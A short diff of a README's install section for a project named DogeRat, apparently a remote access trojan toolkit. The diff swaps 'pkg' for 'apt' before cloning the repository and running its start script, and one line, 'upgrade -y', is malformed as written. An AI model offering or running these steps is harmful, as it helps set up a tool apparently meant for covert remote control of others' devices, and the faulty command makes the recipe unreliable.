@@ -71,8 +71,8 @@
 
 
 ```bash  
-  pkg update && upgrade -y
-  pkg install git -y
+  apt update && upgrade -y
+  apt install git -y
   git clone https://github.com/shivaya-dav/DogeRat 
   cd DogeRat
   bash start.sh
